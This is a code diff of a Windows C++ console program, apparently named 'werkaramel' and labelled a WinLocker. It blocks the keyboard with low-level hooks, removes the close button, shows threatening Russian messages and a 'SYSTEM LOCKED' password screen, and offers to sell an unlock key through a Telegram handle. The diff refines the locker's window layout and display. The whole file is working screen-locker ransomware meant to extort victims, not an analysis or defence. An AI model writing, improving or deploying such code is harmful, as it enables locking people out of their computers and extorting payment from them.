@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — single console, all phases, no fullscreen tricks
+// werkaramel — normal cmd window, all phases
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -14,11 +14,6 @@ HANDLE g_hIn = INVALID_HANDLE_VALUE;
 HWND g_hCon = nullptr;
 std::wstring g_input;
 std::mt19937 g_rng(std::random_device{}());
-
-int RandInt(int lo, int hi) {
-    std::uniform_int_distribution<int> d(lo, hi);
-    return d(g_rng);
-}
 
 const std::wstring SCENE_TEXT =
     L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
@@ -62,32 +57,8 @@ BOOL WINAPI CtrlHandler(DWORD type) {
     return FALSE;
 }
 
-// просто растягиваем консоль на весь экран — БЕЗ убирания рамки
-void MaximizeConsole() {
-    // большой буфер
-    COORD size = {200, 80};
-    SetConsoleScreenBufferSize(g_hOut, size);
-
-    // маленькое окно
-    SMALL_RECT small = {0, 0, 1, 1};
-    SetConsoleWindowInfo(g_hOut, TRUE, &small);
-
-    // растянуть окно на весь экран
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-    SetWindowPos(g_hCon, HWND_TOP, 0, 0, sw, sh, SWP_SHOWWINDOW);
-
-    // показать окно нормально
-    ShowWindow(g_hCon, SW_SHOWNORMAL);
-    SetForegroundWindow(g_hCon);
-
-    // финальный размер буфера под окно
-    CONSOLE_SCREEN_BUFFER_INFO csbi;
-    GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    COORD bufSize = {200, csbi.dwSize.Y};
-    SetConsoleScreenBufferSize(g_hOut, bufSize);
-
-    // шрифт
+void SetupConsole() {
+    // только шрифт — размер окна оставляем стандартный
     CONSOLE_FONT_INFOEX cfi{};
     cfi.cbSize = sizeof(cfi);
     cfi.dwFontSize.Y = 18;
@@ -95,7 +66,7 @@ void MaximizeConsole() {
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 
-    // скрыть системное меню (крестик станет серым)
+    // убираем крестик из меню — но само окно стандартное
     HMENU menu = GetSystemMenu(g_hCon, FALSE);
     if (menu) {
         DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
@@ -121,7 +92,6 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
     return CallNextHookEx(nullptr, code, wp, lp);
 }
 
-// ФАЗА 1: красный flash
 void PhaseRed() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
@@ -136,10 +106,13 @@ void PhaseRed() {
     ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
+    int cols = csbi.srWindow.Right - csbi.srWindow.Left + 1;
+    int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     std::wstring txt = L"В А С   З А М Е Т И Л И";
-    Gotoxy((cols - (int)txt.size()) / 2, rows / 2);
+    int x = (cols - (int)txt.size()) / 2;
+    if (x < 0) x = 0;
+    Gotoxy(x, rows / 2);
     WOut(txt);
     std::this_thread::sleep_for(std::chrono::seconds(1));
 
@@ -147,19 +120,18 @@ void PhaseRed() {
     g_kbHook = nullptr;
 }
 
-// ФАЗА 2: красные правила
 void PhaseRules() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
 
     ClearScreen(0);
     SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-    Gotoxy(2, 2);
+    Gotoxy(1, 1);
 
-    int col = 2, row = 2;
+    int col = 1, row = 1;
     for (size_t i = 0; i < SCENE_TEXT.size(); ++i) {
         wchar_t c = SCENE_TEXT[i];
-        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
+        if (c == L'\n') { col = 1; row++; Gotoxy(col, row); }
         else { WOut(std::wstring(1, c)); col++; }
         std::this_thread::sleep_for(std::chrono::milliseconds(35));
     }
@@ -169,7 +141,6 @@ void PhaseRules() {
     g_kbHook = nullptr;
 }
 
-// ФАЗА 3: зелёное меню
 const wchar_t* BANNER[] = {
     L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
     L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
@@ -183,36 +154,38 @@ void PrintMenu() {
     ClearScreen(0);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    int rows = csbi.dwSize.Y;
+    int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     for (int i = 0; i < 6; ++i) {
-        Gotoxy(2, 1 + i);
+        Gotoxy(1, 1 + i);
         WOut(BANNER[i]);
     }
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(2, 8);
+    Gotoxy(1, 8);
     WOut(L"                        W I N L O C K E R");
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(2, 10);
+    Gotoxy(1, 10);
     std::wstring line(78, L'─');
     WOut(line);
 
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    Gotoxy(4, 12); WOut(L"Выберите действие:");
+    Gotoxy(2, 12); WOut(L"Выберите действие:");
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(4, 14); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
-    Gotoxy(4, 15); WOut(L"[ 2 ]   Купить ключ");
-    Gotoxy(4, 16); WOut(L"[ 3 ]   Выйти");
+    Gotoxy(2, 14); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
+    Gotoxy(2, 15); WOut(L"[ 2 ]   Купить ключ");
+    Gotoxy(2, 16); WOut(L"[ 3 ]   Выйти");
 
     SetColor(FOREGROUND_GREEN);
-    Gotoxy(4, rows - 4); WOut(L"введите число и нажмите Enter");
+    int hintY = rows - 3;
+    if (hintY < 18) hintY = 18;
+    Gotoxy(2, hintY); WOut(L"введите число и нажмите Enter");
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(4, rows - 2); WOut(L"> ");
+    Gotoxy(2, hintY + 1); WOut(L"> ");
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     WOut(g_input + L"  ");
 }
@@ -256,7 +229,6 @@ void PhaseMenu() {
     }
 }
 
-// ФАЗА 4: WinLocker в консоли
 void PhaseLocker() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                  GetModuleHandleW(nullptr), 0);
@@ -268,40 +240,45 @@ void PhaseLocker() {
         ClearScreen(0);
         CONSOLE_SCREEN_BUFFER_INFO csbi;
         GetConsoleScreenBufferInfo(g_hOut, &csbi);
-        int cols = csbi.dwSize.X;
-        int rows = csbi.dwSize.Y;
+        int cols = csbi.srWindow.Right - csbi.srWindow.Left + 1;
+        int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
 
         SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
         std::wstring logo = L"W E R K A R A M E L";
-        Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);
+        int x1 = (cols - (int)logo.size()) / 2; if (x1 < 0) x1 = 0;
+        Gotoxy(x1, 2); WOut(logo);
 
         std::wstring locked = L"S Y S T E M   L O C K E D";
-        Gotoxy((cols - (int)locked.size()) / 2, 6); WOut(locked);
+        int x2 = (cols - (int)locked.size()) / 2; if (x2 < 0) x2 = 0;
+        Gotoxy(x2, 5); WOut(locked);
 
         SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
         std::wstring hint = L"введите пароль для разблокировки:";
-        Gotoxy((cols - (int)hint.size()) / 2, 9); WOut(hint);
+        int x3 = (cols - (int)hint.size()) / 2; if (x3 < 0) x3 = 0;
+        Gotoxy(x3, 8); WOut(hint);
 
         SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
         std::wstring tg = L"tg: @werkaramel";
-        Gotoxy((cols - (int)tg.size()) / 2, 11); WOut(tg);
+        int x4 = (cols - (int)tg.size()) / 2; if (x4 < 0) x4 = 0;
+        Gotoxy(x4, 10); WOut(tg);
 
-        // строка ввода
         SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-        Gotoxy(4, rows - 2);
+        int inputY = rows - 2; if (inputY < 13) inputY = 13;
+        Gotoxy(2, inputY);
         std::wstring masked(g_input.size(), L'*');
         WOut(L"> " + masked + L"_");
 
         if (wrong) {
             SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
             std::wstring err = L"неверный пароль";
-            Gotoxy((cols - (int)err.size()) / 2, 14); WOut(err);
+            int x5 = (cols - (int)err.size()) / 2; if (x5 < 0) x5 = 0;
+            Gotoxy(x5, 13); WOut(err);
         }
 
         INPUT_RECORD rec;
         DWORD read = 0;
-
         bool next = false;
+
         while (!next) {
             if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
                 std::this_thread::sleep_for(std::chrono::milliseconds(30));
@@ -347,7 +324,7 @@ int wmain() {
     GetConsoleMode(g_hIn, &mode);
     SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);
 
-    MaximizeConsole();
+    SetupConsole();
 
     PhaseRed();
     PhaseRules();
